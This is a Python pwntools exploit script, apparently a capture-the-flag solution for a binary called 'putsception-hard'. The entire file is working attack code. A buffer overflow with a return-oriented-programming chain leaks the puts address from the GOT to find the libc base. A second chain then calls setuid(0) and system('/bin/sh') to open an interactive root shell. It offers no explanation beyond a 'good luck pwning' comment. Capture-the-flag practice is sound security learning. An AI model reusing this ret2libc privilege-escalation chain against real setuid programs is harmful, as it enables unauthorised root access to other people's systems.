#!/usr/bin/env python3

from pwn import *

exe = ELF("/challenge/putsception-hard")

context.binary = exe
gdb_script = """
b *main
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

    return r

puts_plt = 0x401090
puts_got = 0x404020
pop_rdi = 0x401cf3
ret = 0x40101a
main_fun = 0x401b93
offset = 72
libc_off = 0x84420

def main():
    r = conn()
    pause()    
# good luck pwning :)
    payload = flat(
        b"A" * offset,
        pop_rdi,
        puts_got,
        puts_plt,
        main_fun
    )

    r.sendline(payload)
    r.recvuntil(b"Leaving!\n")
    leak = u64(r.recvn(6).ljust(8, b"\x00"))
    log.info(f"leaked puts address: {hex(leak)}")
    libc_base = leak - libc_off
    log.info(f"libc base address: {hex(libc_base)}")
    system = libc_base + 0x52290
    binsh = libc_base + 0x1b45bd
    setuid = libc_base + 0xe4150
    payload2 = flat(
        b"A" * offset,
        ret,
        pop_rdi,
        0,
        setuid,
        ret,
        pop_rdi,
        binsh,
        system
    )
    r.sendline(payload2)
    r.interactive()


if __name__ == "__main__":
    main()
